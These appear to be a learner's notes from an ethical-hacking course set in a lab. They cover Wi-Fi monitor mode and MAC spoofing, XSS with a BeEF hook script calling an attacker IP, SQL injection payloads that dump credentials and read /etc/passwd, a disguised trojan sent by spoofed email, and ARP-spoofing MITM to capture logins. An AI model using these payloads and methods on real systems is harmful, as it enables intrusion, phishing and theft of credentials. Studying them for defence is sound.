being able to gain access to a system that you are not supposed to have access to   black/white/grey

connecting wireless adapter to kali ->  monitor mode & packet injection required hence built in adapter is not good anyways
settings-ports-usb-enable-+ (listing shows chipset not brandname

ifconfig wlan0 down - ifconfig wlan0 hw ether 00:11:22:33:44:55 - ifconfig wlan0 up - just changing in memory  sometimes networkmanager
might reset 

iwconfig to list only wireless      - currently mode is managed(capture packets destined for itself)  
ifconfig wlan0 down - airmon-ng check kill (will loose internet connection as well) - iwconfig wlan0 mode monitor - ifconfig wlan0 up
(or airmon-ng start wlan0 - to enable monitor mode)


chipset is the brains of adapter that does all the processing & calculations not the brand - atheros AR9271  then alfa & realtek  recommended

sniffing -> airodump-ng <mon_dev>

wifi bands are 2.4 & 5G    (5 GHz monitoring not widely supported)

airodump-ng --band a <mon_dev>  # for 5G

using metaexploitable as target and keeps security low

info gathering -> ip dns technologies used(server,db,language) subdomains other webisites on same domain 

whois.domaintools.com      to get ip and dns and hosting details
toolbar.netcraft.com    to get technologies used
robtex.com       comprehensive dns records

exploit-db  containslist of latest exploits

gaining access to one website is an entry if  multiple websites run on same server

in bing type ip:<ip>  get multiple webs sharing ip

there might be subdomains that are not advertised like for employees

dirb - the tool to get hidden files in the directory when dir eq route (basically bruteforces with list of file names possibly
present in the directory)

xss - injecting js into page  
3 types  1)stored/persistent in db  executes everytime you visit
2)reflected   only while reaching a manipulated url
3)DOM       interpreted and run on client   WS not involved

reflected - he is trying to inject into text box or corresponding url GET    and types  <script>alert("XSS")</script>  then submit
then such an url is sent to the target 

stored/persistent - leverages the comment section and same code but runs on all clients loading the comments section

beef framework to use stored hook XSS      starting beef  and then commenting   <script  src="ip:3000/hook.js"> </script>
target shown as hooked in beef console   along with the multiple options that beef provions to be executed on the hooked

select * from accounts where user='user_name' and password='12345' and 1=1 #'

so basically need to inject whatever is the code needed in 1=1 section   then instead of and using or     only or needs to be true

the key is to break the things with ' or stuff and try and see the error or and & 1=1 1=2 true false statements

or inject in user field itself just - select * from 'admin' #    bypassing the login simply

GET is supposed to be idempotent and not supposed to make any persistent changes unlike POST

whenever you see something like .php & parameters injection possibilities are there in the url 
also can put order by     but while in url # should be replaced by %23   white space is %20  google to get more

getting the shape of table with order by trials and then select * from 'admin' union select 1,2,3,4 # 

but then using 1,user(),database(),version() #

union select 1,table_name,null,null,5 from information_schema.tables     - applies to my sql 
union select 1,column_name,null,null,5 from information_schema.columns wher table_name='accounts'
union select 1,username,password,is_admin,5 from accounts

file inclusion
union select null,load_file('/etc/passwd'),null,null,null 
union select null,'example example',null,null,null into outfile '/var/www/sitename/example.txt'

sqlmap is the tool for automated injection   sqlmap -u <url>

techniques used for prevention - filters,blacklist, whitelist but they can be bypassed but the best way is parametrization

maltego is the tool for info gathering about anything 

#############################################################################################

autoit is the tool he is using to compile the script after changing the extension from txt to au3. script basically downloads 
image + exe both in an array of urls. Goes to icon archive and gets the required icons and imprints that icon on the converted 
exe using autoit. rw-designer is the website he recommends for image to icon conversion. 
Keeps the file in docuroot and using metaexploit waits for incoming connections. then goes to windows and try downloading the 
file. By the time .exe file is executed hook happens.but .exe extension is obvious unless extensions are hidden in windows settings.
hence need to spoof the extension . But he is copying right-to-left character so that gtrexe.jpg  is written as gtrgpj.exe
but browsers remove the right-to-left extension hence he is archiving it before sending. Then while sending email spamming 
senders address as well using data gathered in previous phase. You could use an online site to do the spoofing but since 
they are public they would be already blacklisted and would end up in spam folder. 
beef wil ask for username password at initial login and open up firefox when done. Requires the hook.js be executed. He puts 
hook.js inside index file in docuroot and accesses the apache2 from win machine and it gets displayed in beef online devices.
In beef commands tab is of interest since it allows commands to be executed on remote machine. he is using 'bettercap' to spoof
as well. bettercap helps you downgrade https to http. In commands search for alerts and create alert dialog. Spyder eye gives 
screenshot. Another command is 'redirect' to have them to any other page. prettytheft is for fake logins. fake notification 
to tell corresponding browser to download extension and get reverse shell or backdoor. Again metaexploit is used for the reverse
shell. way to prevent the trojan is to right click properties and see the file type and make sure its jpg and not application exe
In windows ther is a tool called resource manager using that is similar to netstat to get ports and all in networking section.
Hybrid-analysis is one of the sandbox providers where you could test the trojans and analyze what they would do. 

mitm - basically sending a broadcast asking who has IP? and the target responds its MAC. arpspoof -i eth0 -t clientIP gwIP
plus a packet sniffer likecwireshark to analyze the data. But by default,routing is not enabled hence packets will be dropped.
Thus needs to enable port-forwarding.  echo 1 > /proc/sys/net/ipv4/ipforward. Then target will still get internet access. 
Bettercap is advanced than arpspoof. bettercap -iface eth0 then you are inside the tool prompt, typing net.probe on to start 
discovering other nodes in the subnet by sending udp packets. then use net.show to get a list of connected clients in a table.
set arp.spoof.fullduplex true . set arp.spoof.target targetip . then arp.spoof on - to turn on the module. Also ensure that net.probe
&net.recon are running as well. Making use of net.sniff module in bettercap itself to analyse the packets instead of tools 
like wireshark.Generating traffic by reaching http url from win machine. By now it captueres everything including logins. 




















 









